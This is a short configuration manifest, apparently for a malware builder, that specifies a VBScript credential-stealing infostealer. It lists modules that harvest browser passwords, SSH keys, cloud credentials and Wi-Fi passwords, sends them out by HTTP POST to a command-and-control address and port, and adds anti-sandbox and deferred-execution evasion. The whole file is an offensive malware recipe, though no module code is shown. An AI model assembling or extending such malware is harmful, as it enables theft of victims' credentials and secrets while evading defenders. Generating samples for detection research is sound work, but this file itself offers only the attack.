name: vbs_infostealer_creds
description: VBScript credential harvester - browsers, SSH, cloud, wifi
format: vbscript

core:
  - core/emit_buffer
  - core/run_cmd
  - core/file_ops

collectors:
  - collectors/sysinfo
  - collectors/browser_chromium
  - collectors/ssh_keys
  - collectors/cloud_creds
  - collectors/wifi_passwords

exfil: exfil/http_post
arch: arch/sequential

evasion:
  - evasion/anti_sandbox
  - evasion/deferred_exec

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
